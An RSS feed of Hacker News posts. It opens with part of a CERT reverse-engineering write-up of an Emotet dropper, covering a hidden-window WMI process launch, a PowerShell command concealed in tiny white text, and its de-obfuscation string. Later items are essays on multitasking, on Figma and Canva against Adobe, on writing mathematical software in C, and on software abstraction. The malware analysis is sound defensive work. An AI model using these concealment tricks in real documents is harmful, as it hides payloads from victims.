<p>Well, it spawns a process calling the <code>Win32_Process.Create()</code> method (line 10). The startup information parameter says “do not show a window” (line 9). Further, the command line parameter holds the command that will be invoked by the spawned process. As we can observe in the code, the command is already in the document (lines 4-5) together with some junk that is removed (line 6).</p>



<p>So there was something more in the document itself apart from the fake popup window.</p>



<h3><span id="The_PowerShell_script"></span>The PowerShell script<span></span></h3>



<p>First, we removed the formatting. In this way we revealed a paragraph that was kept out of the victim’s sight (it was formatted with a font size of 2px and a white font color):</p>



<div><figure><a href="https://cert.grnet.gr/wp-content/uploads/2021/02/emotet-dropper-powershell-1-edited.png" rel="prettyPhoto[gallery-mHtF]"><img loading="lazy" width="1280" height="720" src="https://cert.grnet.gr/wp-content/uploads/2021/02/emotet-dropper-powershell-1-edited-1.png" alt="" srcset="https://cert.grnet.gr/wp-content/uploads/2021/02/emotet-dropper-powershell-1-edited-1.png 1280w, https://cert.grnet.gr/wp-content/uploads/2021/02/emotet-dropper-powershell-1-edited-1-300x169.png 300w, https://cert.grnet.gr/wp-content/uploads/2021/02/emotet-dropper-powershell-1-edited-1-1024x576.png 1024w, https://cert.grnet.gr/wp-content/uploads/2021/02/emotet-dropper-powershell-1-edited-1-768x432.png 768w" sizes="(max-width: 1280px) 100vw, 1280px"></a><figcaption>Figure 5. Obfuscated PowerShell command hidden in document body</figcaption></figure></div>



<p>This looked obfuscated, too. But we already know how to de-obfuscate it, i.e.  <code>Replace(commandLine, "][ 1) jjkgS [] []w", Empty)</code>:</p>



<div><figure><a href="https://cert.grnet.gr/wp-content/uploads/2021/02/emotet-dropper-powershell-2.png" rel="prettyPhoto[gallery-mHtF]"><img loading="lazy" width="1024" height="305" src="https://cert.grnet.gr/wp-content/uploads/2021/02/emotet-dropper-powershell-2-1024x305.png" alt="" srcset="https://cert.grnet.gr/wp-content/uploads/2021/02/emotet-dropper-powershell-2-1024x305.png 1024w, https://cert.grnet.gr/wp-content/uploads/2021/02/emotet-dropper-powershell-2-300x89.png 300w, https://cert.grnet.gr/wp-content/uploads/2021/02/emotet-dropper-powershell-2-768x229.png 768w, https://cert.grnet.gr/wp-content/uploads/2021/02/emotet-dropper-powershell-2.png 1262w" sizes="(max-width: 1024px) 100vw, 1024px"></a><figcaption>Figure 6. De-obfuscated PowerShell command</figcaption></figure></div>
</div></div></div></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://cert.grnet.gr/en/blog/reverse-engineering-emotet/">https://cert.grnet.gr/en/blog/reverse-engineering-emotet/</a></em></p>]]>
            </description>
            <link>https://cert.grnet.gr/en/blog/reverse-engineering-emotet/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26062586</guid>
            <pubDate>Mon, 08 Feb 2021 09:56:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The first investment app that will make you cry right after the installation]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=26062361">thread link</a>) | @domnuprofesor
<br/>
February 8, 2021 | https://www.qooore.com/robinwho | <a href="https://web.archive.org/web/*/https://www.qooore.com/robinwho">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.qooore.com/robinwho</link>
            <guid isPermaLink="false">hacker-news-small-sites-26062361</guid>
            <pubDate>Mon, 08 Feb 2021 09:21:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Myth of Multitasking: Why fewer priorities leads to better work]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26062289">thread link</a>) | @jonmal
<br/>
February 8, 2021 | https://blog.doit.io/the-myth-of-multitasking/ | <a href="https://web.archive.org/web/*/https://blog.doit.io/the-myth-of-multitasking/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
    <div>

        <article>

            

           <!-- 
            <figure class="post-full-image">
                <img
                    srcset="/content/images/size/w300/2020/06/MythOfMultitasking.jpg 300w,
                            /content/images/size/w600/2020/06/MythOfMultitasking.jpg 600w,
                            /content/images/size/w1000/2020/06/MythOfMultitasking.jpg 1000w,
                            /content/images/size/w2000/2020/06/MythOfMultitasking.jpg 2000w"
                    sizes="(max-width: 800px) 400px,
                        (max-width: 1170px) 1170px,
                            2000px"
                    src="/content/images/size/w600/2020/06/MythOfMultitasking.jpg"
                    alt="The Myth of Multitasking: Why Fewer Priorities Leads to Better Work"
                />
            </figure>
            -->

            <section>
                <div>
                    <p>I know you don’t want to hear it. But multitasking isn’t effective. In this day and age of extreme busyness and “how much can we get done in a day” mentality, everyone is trying to do more — all at once. </p><!--kg-card-begin: markdown--><blockquote>
<p><span>"We claim to be multitasking, but in reality, we are just tackling several tasks in a far less effective way than we would if we simply focused on one at a time."</span></p>
</blockquote>
<!--kg-card-end: markdown--><p>We seem to think that <em>doing more</em> gives us more value as human beings. That somehow the <em>doing</em> gives us meaning and purpose (as opposed to what is actually accomplished). And we have trouble distinguishing between what is truly important and what is not. Or perhaps the problem comes in making the <em>choice</em> of what is important — in other words: choosing the priority.</p><figure><img src="https://blog.doit.io/content/images/2020/06/MythOfMultitasking-1.jpg" alt="The myth of multitasking"><figcaption>The myth of multitasking</figcaption></figure><p>Notice I said <em>priority</em>, singular. In essence, the definition of the word <em>priority </em>means <em>something of highest importance that comes before other things</em>. When you truly think about it, it is impossible to have more than one. If you claim to have, for instance, ten priorities, then there is really no priority. They all become of equal importance and none of them is coming before the other. </p><!--kg-card-begin: markdown--><blockquote>
<p><span>"When we try to multitask, we are basically refusing to choose a priority in that moment."</span></p>
</blockquote>
<!--kg-card-end: markdown--><p>We are forcing our brain to battle it out, and unfortunately, it is a losing battle.</p><h2 id="the-brain-s-reality">The Brain’s Reality</h2><p>So is it really totally impossible to multitask? After all, people claim to be doing it all the time. In fact, many of us pride ourselves on it. We look at younger generations — those growing up immersed in technology — as being experts in multitasking. </p><p>Well, it’s possible to do some simple tasks at the same time — like walking and talking. But when it comes to concentrated work, multitasking just isn’t scientifically possible. Instead, when we try to do two types of work at the same time that require our concentration, our brain switches back and forth from task to task. </p><p>Okay, so maybe we switch back and forth. But we’re still getting both things done right? Possibly. But the cost is often not worth it. Your brain is working much harder than it needs to. In fact, it’s overwhelmed with the constant switching of information. </p><h2 id="the-cost-of-the-switch">The Cost of the Switch</h2><p>Each time your brain switches from focus on one thing to focus on another, it takes time to recalibrate. Imagine it as refocusing a camera lens on two different subjects, back and forth. It takes a few seconds to change the focus each time, and those seconds add up. And when the tasks are really high-information tasks, like coding, for instance, it takes even longer to get back to full focus.</p><p>So you actually <strong>lose valuable time</strong> when you attempt to multitask. Not only that but your attention is divided. The switch puts you in an attention debt that takes a toll on your mental state. You are more likely to make mistakes and produce lower-quality work than <a href="https://blog.doit.io/focus-on-one-thing-leads-to-better-work/">if you were to simply do one thing at a time.</a> </p><h2 id="the-challenge-of-focus">The Challenge of Focus</h2><p>Despite the facts laid out in front of us, we continue to attempt multitasking. We churn out the work and check off the boxes like we are competing for a prize at the end of the day. And our lives are set up to encourage this. </p><p>Our smartphones are mini-computers that we carry with us everywhere. Sure, they are very convenient, but they are also constant distractions pulling at our attention. Many of us also compulsively check our email and text messages. The pace of communication today is such that we feel like we can’t afford not to. Some workplaces are set up in such a way that we are <em>expected</em> to respond immediately to any messages sent. Unfortunately, this takes a toll on our focus, too.</p><h2 id="narrowing-down-your-priorities">Narrowing Down Your Priorities</h2><p>Streamlining your priorities is a choice. And it may well be a tough one. But if you want to produce higher-quality work and reduce the stress on your brain, it’s worth it. Perhaps it’s too much to expect you to choose one single priority. But it starts with narrowing down your total priorities. And then simply choosing ONE priority for a specific chunk of time. One single thing to focus on.</p><p>So, take a step back and zoom out to the bigger picture of your life or your job. What is <em>truly</em> important to you or to your role? You may want to have a ranking system so you place areas of life or goals in order of importance. When you put some thought into it and make these choices “ahead of time,” it allows you to stay true to your priorities in the heat of the moment. When something comes up in your day and you have to choose what gets your full attention, you have already decided on your priorities.</p><h2 id="weed-out-the-multitasking">Weed Out the Multitasking</h2><p>Start eliminating the multitasking moments and improving your focus and work quality by choosing one time-slot per day where you will focus on one single task. Just start with one. Don’t make it too big — 30-45 minutes is enough to start. (Your brain needs breaks, too.) As you discover the value in doing this, you’ll likely want to add more chunks of focused time.</p><p>As you work on weeding out the multitasking, think of consolidating other things you do during a given day. Because another thing that weakens our focus is role-switching. So when we switch from making phone calls (which is one type of skill) to writing a brief (which is another skill) to filling out a form (which is another), it also tires our brains unnecessarily. Instead, look at how you can group similar types of tasks together. </p><p>This means email, too.</p><!--kg-card-begin: markdown--><blockquote>
<p><span>"Instead of keeping your browser open all day and responding as they come in, give yourself set times to handle email."</span></p>
</blockquote>
<!--kg-card-end: markdown--><p>If that makes you nervous (<em>“What if I don’t respond to someone right away?!”</em>), then perhaps include in your email signature a line that says, “I check email at 10 a.m., 1 p.m., and 4 p.m.” This gives them an indication of when they can expect a response. Checking email constantly might be a tough habit to break, but remember it <em>is</em> a habit that we’ve built up. Don’t forget there was a time when there was no email and no smartphones. And everyone survived.</p><p>We have incorporated distractions into our lives, and they are disguised as a means to be “connected” and “more productive.” Be aware of what is truly helping you be productive and what is actually keeping you from the goals you really care about.</p><h2 id="systems-to-try">Systems to Try</h2><p>Choosing priorities and improving focus have been issues for many people for a very long time. So know you are not alone in the struggle. Luckily, those before you have also created systems and processes to help simplify things. </p><p>If you are in the market for a more structured approach to deciding on priorities and focusing, perhaps try David Allen’s <a href="https://blog.doit.io/getting-things-done-gtd-method/"><em>Getting Things Done</em></a> system to give you some fresh clarity. Or try the <a href="https://blog.doit.io/the-pomodoro-technique-boost-your-productivity/"><em>Pomodoro technique</em></a> to give you a framework for focused work. The <a href="https://blog.doit.io/the-ivy-lee-method/"><em>Ivy Lee Method</em></a> helps you to minimize your daily priorities, and the <a href="https://blog.doit.io/the-eisenhower-matrix/"><em>Eisenhower Matrix</em></a> helps you determine what is truly important vs. urgent.</p><p>There are many systems and processes to choose from, all with slightly different approaches for improving your productivity. None are right or wrong — it’s all about what will work for you. I suggest you choose one to try and give it a few weeks to see whether it helps you or not. Ultimately, the change will need to come from within you and your own desire to produce higher quality work with less stress. And remember that the way we work is habit, and we have the power to transform our habits for the better. But it doesn’t happen overnight. So matter how you choose to approach it, remember to give it time and stay committed.</p><h2 id="the-benefits-of-single-tasking-and-fewer-priorities">The Benefits of Single-Tasking and Fewer Priorities</h2><p>There is a state that is possible to reach <em>only</em> when your focus is pure and your attention is on a single task. That is the state of <strong>Flow</strong> (discussed in detail by Mihaly Csikszentmihalyi in his book of the same name). Creative thinking is at a maximum and you are completely <em>in the zone</em>. The quality of work is usually very high. And not only that, but the feeling you get when you are able to work in this state is truly wonderful. </p><p>Accomplishment. Pride. Fulfillment. </p><p>Fewer priorities means you can give your <strong>all</strong> to your goals. It means you waste less time and undoubtedly feel more energetic. It equals lower levels of stress and reduced anxiety. With the facts laid out before you, it seems ridiculous to keep attempting the false process which is multitasking! Give single-tasking a try and experience the wealth of benefits to your workflow and quality.</p><p><a href="https://blog.doit.io/what-is-productivity/">&lt;- Go back to The Productivity Guide</a><br></p>
                </div>
            </section>



        </article>

    </div>
</div></div>]]>
            </description>
            <link>https://blog.doit.io/the-myth-of-multitasking/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26062289</guid>
            <pubDate>Mon, 08 Feb 2021 09:11:20 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to Eat an Elephant, One Atomic Concept at a Time]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26061924">thread link</a>) | @sethbannon
<br/>
February 8, 2021 | https://kwokchain.com/2021/02/05/atomic-concepts/ | <a href="https://web.archive.org/web/*/https://kwokchain.com/2021/02/05/atomic-concepts/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p><strong>How Figma and Canva are taking on Adobe—and winning</strong></p>



<p>In 2010, Photoshop was ubiquitous. Whether you were editing a photo, making a poster, or designing a website, it happened in Photoshop.&nbsp;</p>



<p>Today, Adobe looks incredibly strong. They’ve had spectacular stock performance, thanks to clear-eyed management who’ve made bold bets that have paid off. Their transition to SaaS has been seamless, for which the public markets have rewarded them handsomely. And they’re historically one of the <a href="https://en.wikipedia.org/wiki/List_of_acquisitions_by_Adobe">best companies at M&amp;A</a>; their product lineup is a testament to their ability to acquire new product lines and integrate them well into their multi-product ecosystem. Perhaps most importantly and least appreciated, they have dramatically sped up the cadence of their internal product development process and feedback loop. Like Microsoft, they have successfully shifted from a legacy company operating on an annual (or longer) release schedule to a truly cloud company shipping updates at a sub-weekly pace.</p>



<p>Nevertheless, there are a few segments of design where they’re no longer the market leader. Companies like Figma, Sketch, and Canva are examples of products that have been able to become top products despite Adobe’s ubiquity in all things design. Figma showed up in Adobe’s annual report for the first time in <a href="https://www.bamsec.com/filing/79634320000013">2019</a>. They reprised in <a href="https://www.bamsec.com/filing/79634321000004">2020</a>, and I’m not uncertain they will continue to be in it going forward.</p>



<p>How should we understand these market transitions and why these young companies are able to thrive, even against a strong incumbent like Adobe?</p>



<p>These companies have distinct atomic concepts from Adobe. The primitives that their products are built around are fundamentally different from those of Adobe’s product lineup. It’s these different fundamental atomic concepts that turn Adobe’s advantage of an established product and existing userbase into a weakness that hinders their ability to counter these upstarts. The opportunity for these new atomic concepts to thrive is driven by the new use cases and types of users unearthed during market transitions.</p>



<p>Understanding the phases of market transition and what drives them is a universal process worth examining.</p>



<h2>New use cases: designing for digital</h2>



<p>For most markets, there are advantages to being an incumbent. Markets converge as companies arrive at the preference frontier of customers. This leaves little potential energy for new startups to take advantage of.</p>



<p>Market entropy is good for new entrants.</p>



<p>It’s not impossible to break into a market by brute force, but it’s hard. Very hard. Most successful companies, especially startups, have found tailwinds to harness that help pull them forward.</p>



<p>Changing customer needs are the largest source of entropy in markets. When customer needs rapidly change, there is less advantage in being an incumbent. Instead, legacy companies are left with all the overhead and a product that no longer is what customers want.</p>



<p>There are many causes of changing customer needs. Often there are new and growing segments of customers with different use cases. Existing products may work for them, but they aren’t ideal. The features they care about and how they value them are very different from the customers the legacy company is used to. Companies resist changing core parts of their product for every new use case since it’s costly in work, money, and attention. But every once in a while, what was once a small use case grows into one large enough to support its own company.</p>



<p>Other times the scale or dynamics of a market shift enough to make a product no longer work despite having been a great fit. Companies are often caught flat-footed by these situations because what they have done successfully for years suddenly starts to falter—and they aren’t sure why. Ebay is a good example of this. Their decentralized auction model was very good in a nascent internet economy when there was a scarcity of items being sold online. Once ecommerce became commonplace, price and speed became much more important factors and Ebay’s decentralized model was at a disadvantage. Amazon was much better at building economies of scale in this post-liquidity ecosystem.</p>



<p>Another source is when the customers themselves change. Often the function of a tool remains the same, but the type of user changes. These new types of customers often have different things they care about and resulting product needs.</p>



<p>The internet drove entirely new design use cases. Photoshop was built for editing photos and images. It’s a powerful tool that operates at the pixel level. However, many of these new uses weren’t about image manipulation. Images were a component—not the essence—of the job users were trying to accomplish.</p>



<p>For some users, this was designing digital products. Designers at software companies or any company with a website wanted to create the websites and software products they worked on. This is less about image manipulation and more about designing the UI and UX of these digital products. Vectors are more important than raster graphics. The complexity and process of designing these high-value designs also got increasingly more sophisticated. These designers worked with teams of other designers and non-designers. Their designs are part of a larger product development process and what mattered wasn’t just making a design, but how that the entire process could be improved to make collaboration easier and handoff of designs better. Iteratively.</p>



<p>The complexity of the designs and the components in the resulting code became more complex, too. The need for their tools to have a higher-level understanding of the components and variants became more important. It’s increasingly useful for designs to understand the same concepts and abstraction levels as the HTML and CSS in the resulting end product.</p>



<p>For some users, this was designing content for social platforms, digital ads, or even wedding invitations. These were often made in Photoshop, but again, pixels are the wrong abstraction level. Images are not the sole component; they are just past of a larger design that includes graphics, text, and more. Similarly, the customers are very different. Many of the people now doing what is, in essence, design work don’t think of themselves as designers. They just have a very specific thing they want to create, with the least friction possible.</p>



<p>The internet dramatically scales up the volume and type of new use cases for design. In many ways, this helps Adobe. With platforms like Instagram, the number of people editing photos has expanded by many orders of magnitude. While editing on platforms like Instagram may have increased significantly, Adobe has been a huge beneficiary of the internet and the shift to cloud—and their <a href="https://www.google.com/finance/quote/ADBE:NASDAQ">stock price</a> is a testament to this.</p>



<p><em>[KK Note: Platforms like Instagram strapping editors onto their social platforms and eating into Lightroom from the bottom up is well worth its own discussion. And perhaps someone will convince Mike Krieger to do the definitive piece on that.]</em></p>



<figure><img loading="lazy" width="800" height="559" src="https://i2.wp.com/kwokchain.com/wp-content/uploads/2021/02/image.png?resize=800%2C559&amp;ssl=1" alt="" srcset="https://i2.wp.com/kwokchain.com/wp-content/uploads/2021/02/image.png?w=800&amp;ssl=1 800w, https://i2.wp.com/kwokchain.com/wp-content/uploads/2021/02/image.png?resize=300%2C210&amp;ssl=1 300w, https://i2.wp.com/kwokchain.com/wp-content/uploads/2021/02/image.png?resize=768%2C537&amp;ssl=1 768w" sizes="(max-width: 800px) 100vw, 800px" data-recalc-dims="1" data-lazy-srcset="https://i2.wp.com/kwokchain.com/wp-content/uploads/2021/02/image.png?w=800&amp;ssl=1 800w, https://i2.wp.com/kwokchain.com/wp-content/uploads/2021/02/image.png?resize=300%2C210&amp;ssl=1 300w, https://i2.wp.com/kwokchain.com/wp-content/uploads/2021/02/image.png?resize=768%2C537&amp;ssl=1 768w" data-lazy-src="https://i2.wp.com/kwokchain.com/wp-content/uploads/2021/02/image.png?resize=800%2C559&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>Software may be eating the world. But it’s also building new worlds? I’m going to need a refresher on remembering the Andreessen Horowitz talking points</figcaption></figure>



<p>This is even more true in video. There are orders of magnitude more video creators as the ability to record video has become ubiquitous and the platforms where video is the default format have grown. Even more striking, many of the dominant video platforms—like Youtube—are purely distribution focused. They don’t even have any editing capabilities. Instead, companies like Adobe end up being large beneficiaries of this need.</p>



<p><em>[KK Note: Platforms like Youtube still having not built any semblance of an editor into their platform is *also* well worth its own discussion. I’d say we’ll never know what could be, but then I look at TikTok and all is right with the world.]</em></p>



<p>But Adobe hasn’t captured it all. And in many of these new emergent use cases and customer types, Adobe has lost the lead to new startups.</p>



<h2>Tapping into the right level of abstraction</h2>



<p>The best products map to how customers think about their workflow. They match the abstraction level of their customers: not too high that it’s unusable, but not too low that it’s hard to use easily or extend in more complex ways.</p>



<p>They choose the right atomic concepts.</p>



<p>These are the core concepts around which the entire product is built. They not only align with how customers think of their workflow, but often crystallizes for customers how they ought to. Great atomic concepts are honed and then extended and built upon in more complex compounds that…well for lack of a better word…<em>compound</em>.</p>



<p>Similar companies often have slightly different atomic concepts that end up making them meaningfully distinct. Photoshop is focused on pixels and images. Its focus is on editing images and pictures. And its functions operate by transforming them on a pixel level.</p>



<p>Illustrator is similar, but it operates on vectors, not pixels. This is a higher level abstraction. Neither is better or worse, they are just more suited to different use cases. Photoshop is better for modifying images, while illustrator is built for designs where scale-free vectors are best.</p>



<p>Sketch, like Illustrator, is vector based. But is designed for building digital products which means things like operating at a project level. It is not individual designs, but crafting entire products and user interfaces—and the needs for repeatability and consistency inherent to that.</p>



<p>Figma builds on Sketch’s approach, but also includes a greater focus on not just projects but the entire collaborative process as the relevant scope. Similarly, it also treats higher level abstractions like plugins, community, and more as equally important concepts.</p>



<p>Canva is similar to Photoshop and Illustrator, but its users aren’t designers who care about low level tools. Instead Canva’s core atomic concepts are around the different …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://kwokchain.com/2021/02/05/atomic-concepts/">https://kwokchain.com/2021/02/05/atomic-concepts/</a></em></p>]]>
            </description>
            <link>https://kwokchain.com/2021/02/05/atomic-concepts/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26061924</guid>
            <pubDate>Mon, 08 Feb 2021 08:08:42 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Developing Mathematical Software in C]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26061432">thread link</a>) | @rurban
<br/>
February 7, 2021 | https://fredrikj.net/blog/2021/01/developing-mathematical-software-in-c/ | <a href="https://web.archive.org/web/*/https://fredrikj.net/blog/2021/01/developing-mathematical-software-in-c/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main">
<p><a href="https://fredrikj.net/">fredrikj.net</a> / <a href="https://fredrikj.net/blog">blog</a> / </p>

<p><i>January 28, 2021</i></p>


<p>
I sometimes get asked whether it makes sense to implement <i>XYZ</i> in C,
especially compared to using some language that is more advanced
(C++, Julia, Python, Haskell or Rust) or perfect (Lisp).
</p>

<p>
I suspect that a lot of people are a bit intimidated by C and believe that
it requires some kind of superhuman hacker ability to wield.
That's at least how I felt about C
before I started really using it.
Other people believe that C is a horrible
language that inherently produces defective software
and which should be cast back into the abysses of UNIX from whence it came
(they are not necessarily wrong).
I personally think that C's simplicity
is an advantage that
often outweighs its disadvantages,
but there are clearly domains where C is a bad choice.
In domains where C works well, there are also good
alternatives, and choosing C then just comes
down to personal preference.
</p>

<p>
In this post, I will attempt to answer why you should or shouldn't use C,
and I will give some general advice that may be helpful if you end up using C.
This is based on my own experience developing
mathematical software in C (mainly <a href="https://flintlib.org/">Flint</a>,
<a href="https://arblib.org/">Arb</a> and <a href="https://fredrikj.net/calcium/">Calcium</a>), in an academic setting.
This experience will not necessarily transfer well to other settings.
</p>

<h2>Why you should use C</h2>

<p>Why should you write your next library
in C, or perhaps contribute to some existing C library?
I will offer four simple arguments.</p>

<h3>Availability</h3>

<p>
Reason number one is that C is stable, universally supported,
and has reliable tooling.
Your plain C library will compile and run
almost anywhere, can be developed anywhere,
and will require minimal dependencies. Users of virtually
any other programming language can easily interface with your code
through their language's C foreign function interface,
at least if you take basic precautions to design a decent external API.
Not only will your C library run anywhere
<i>right now</i>; it will still run 20 years from now,
and if you had a time machine, probably 20 years ago too.
</p>

<h3>Speed</h3>

<p>
Reason number two is that it will run very, very fast.
I don't just mean that
benchmark loops will
go <i>VROOOM</i>; your software will also start up instantly
(no need to load a bloated dynamic runtime or JIT-compile code),
and there will be no hidden overhead for things like automatic
garbage collection
(well-written C code spends a negligible fraction of its overall
execution time doing allocations and deallocations,
precisely at the points in time where they are needed).
This is, of course, <i>if you know what you are doing</i>.
Writing efficient C, while not exactly rocket surgery, does require
proficiency with the language and a solid understanding
of fundamental algorithms and data structures.
</p>

<h3>Readability</h3>

<p>Reason number three is that you will be able to read your
own code, and others will incidentally be able to read it too.
Some people are going to disagree with me here, arguing that higher
level languages are better for readibility.
That is trivially true in the sense that higher level languages
provide abstractions that allow expressing complex ideas more
succinctly.
A simple example is providing operator overloading so that you
can write <tt>a + b * c</tt> instead of something like <tt>add(a, mul(b, c))</tt>,
or in C, often something even more verbose like the following typical <a href="https://gmplib.org/">GMP</a> snippet:
</p>

<pre>mpz_t tmp;
mpz_init(tmp);
mpz_mul(tmp, b, c);
mpz_add(a, a, tmp);
mpz_clear(tmp);
</pre>

<p>This
would seem like an especially important point for mathematical software.
However, hiding details can also
hide useful information.
In an object-oriented, memory-managed,
operator-overloaded language, information that may be
hidden by the infix arithmetic notation includes
where and how memory is allocated;
how methods are resolved and how coercions are made
when the operands have different types
or when class hierarchies are involved;
what algorithms are used to perform the arithmetic operations
(irrelevant for machine integers, but potentially very important
details if you are multiplying huge matrices).
The infix notation is usually good for understanding the intent
of the code, but something more verbose can be
better for reasoning about performance
and for dealing with cracks in the abstractions.
Put concisely, C is good for making implementation details explicit
when implementation details matter.
</p>

<p>Viewed in this light, C's omission of certain conveniences
such as namespaces, overloading and generics is actually a feature,
not a bug.
Figuring out what any given piece of C code does tends to be
a straightforward process because of, and not despite, the fact
that it is verbose: everything that happens is explicit and functions and types can only have a
single definition which is easy to grep for.
I can't recall ever really having trouble diving into someone else's C code
or reading C code that I wrote a long time ago.
The same can't be said for Python, for example, where it can be
a real struggle to understand which method on which class gets called and how
and when and in what context.
Granted, you <i>can</i> obfuscate C code by abusing macros, doing
complicated runtime generics, or using cryptic names,
but even something like the rather dense
and idiosyncratic <a href="https://pari.math.u-bordeaux.fr/">Pari/GP</a>
codebase is penetrable after a short familiarization process.
</p>

<h3>Educational value</h3>

<p>
Reason number four is that you will learn a lot in the process of writing C.
Implementing algorithms in C instead of a higher-level language
can lead to a deeper understanding since you have
to do more of the groundwork yourself. You will also probably have to
think things through more carefully; when I write Python, I can often
get away with implementing something half-broken and fixing it piecemeal,
but C more often forces me to be correct up-front.
</p>

<h2>Why you shouldn't use C</h2>

<p>Now on to the far more interesting case <i>against</i> C,
or rather, a fair and balanced evaluation of C's weaknesses.</p>

<h3>Mathematical understanding</h3>

<p>
Since we are talking about <i>mathematical</i> software, it is likely
that implementing <i>XYZ</i> actually involves solving two problems: understanding the
mathematics of <i>XYZ</i>, and translating that understanding
to concrete algorithms and code. If you don't understand the mathematics,
you might be better off exploring the problem
using a high-level language or a computer algebra system
and postponing a C implementation (if you need it) until
your mathematical understanding has crystallized.
If you decide to start a C project right away
to figure out the mathematics in parallel with the software development,
you will probably still want to use
another language for experimentation (more on this later).
Be prepared to continuously reevaluate your assumptions, and
expect having to rewrite code from scratch more than once.
</p>

<h3>Portability and deployment</h3>

<p>The following comments mainly apply to starting a new project
intended to be used by other people.</p>

<p>
In practice, the claims about C's amazing portability are somewhat
exaggerated.
As a C library maintainer,
you will have a lot of fun gradually discovering
new inconsistencies in build systems and standard library implementations
between different operating systems and hardware configurations.
You will probably run into the occasional rare compiler bug (though C might be
one of the better languages in this regard).
Over time, your header files will probably accumulate hundreds
of <tt>#ifdef</tt>s intended to work around compatibility problems
that may or may not still exist.</p>

<p>The large majority of your prospective users will probably
be unable or unwilling to
build and install your library from source, so
you will either have to distribute binaries yourself or
rely on distribution via third-party
package repositories such as those of the major Linux distributions.
In the interest of stability
or because of a lack of manpower,
such repositories typically keep software 1-10 years out of date.
(Yes, I once found <a href="https://travis-ci.org/">Travis CI</a>'s default Ubuntu configuration sporting a nearly 10 years old
Flint-1.6.)
In other words, you can't count on users having access to the latest features
and bugfixes
in your library, and it goes without saying that you should work
very hard to preserve backward compatibility.
I suppose this lag in deployment has one advantage for reproducible research: if
you submit a journal paper based on the cutting edge version of your software,
readers will probably still have access to that version in Debian LTS
by the time the publishing process completes three years later
(hi, <a href="https://dl.acm.org/journal/toms">ACM Transactions on Mathematical Software</a>).</p>

<p>
A good idea for widespread deployment is to get your mathematical library into
<a href="https://www.sagemath.org/">SageMath</a>.
SageMath is maintained by a large community
and tested on many platforms, and packages in SageMath are usually only several months out of date.
</p>

<p>Deploying software written in more modern programming languages is
typically easier since they have more sane build processes
and standard libraries that eliminate most of C's platform-dependent
headaches.
Nowadays many languages also have their own easy-to-use packaging systems
and centralized package repositories.
In practice, the best languages for portability and easy distribution
right now are probably (1) JavaScript (in the browser), and (2) Python.
Julia is not far behind, and in many respects better designed than Python,
but Python currently has the benefit of being preinstalled on many systems.
All of this being said,
<a href="https://emscripten.org/">Emscripten</a> is a promising
alternative distribution method for C code which may change the equation,
especially if you think a browser-based interface makes more
sense than linking together libraries and running code
in the terminal in the traditional way.
</p>

<h3>Safety</h3>

<p>
C has a reputation of leading to buggy, crash-prone software
and disastrous security vulnerabilities.
Commonly criticized aspects of C include its
manual memory management, weak type system, and
deviously undefined or implementation-defined semantics.
This reputation is generally deserved,
though in C's defense, I think the problems often</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://fredrikj.net/blog/2021/01/developing-mathematical-software-in-c/">https://fredrikj.net/blog/2021/01/developing-mathematical-software-in-c/</a></em></p>]]>
            </description>
            <link>https://fredrikj.net/blog/2021/01/developing-mathematical-software-in-c/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26061432</guid>
            <pubDate>Mon, 08 Feb 2021 06:32:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Is Software Abstraction Killing Civilization?]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26061170">thread link</a>) | @luu
<br/>
February 7, 2021 | https://www.datagubbe.se/endofciv/ | <a href="https://web.archive.org/web/*/https://www.datagubbe.se/endofciv/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<h2>Is Software Abstraction Killing Civilization?</h2>

<p><b>Or: Jonathan Blow is wrong but also right and we still
need to prevent the collapse of civilization</b></p>

<p><i>Early 2021</i></p>

<p>
I recently stumbled upon
<a href="https://www.youtube.com/watch?v=ZSRHeXYDLko">a talk by game
development guru Jonathan Blow</a>, about how software 
abstraction will lead to the end of civilization. Quick summary:
</p>
<ul>
  <li>Information passed on between generations is diluted.
    Practise is better than theory for keeping skills alive.</li>
  <li>Software runs the world.</li>
  <li>Abstraction fosters ignorance about low level programming.</li>
  <li>If we forget low level stuff, civilization will fall apart
    since we won't be able to keep vital software running.</li>
</ul>
<p>
It was one of those 
talks that might at a first glance seem perfectly reasonable, not least 
because similar ideas are regularly discussed in programmer circles by a
great number of 
people. Then you start thinking about what's said, and all the errors and 
misconceptions presented makes you feel troubled, because it's both 
tempting and easy to perpetuate the punchlines without
considering their implications. <b>I agree with Blow that it's
important to pass knowledge between generations. Therefore, the veracity
of that information is extremely important.</b> I propose that
the information given in the very talk about the importance of
such information, is in fact wrong on many counts.
</p>

<p>
That's why I, in this rather long text, have tried to examine Blow's
claims in detail. (TL;DR: Someone is wrong on the Internet - man with
ample spare time on his hands to the rescue!)
</p>

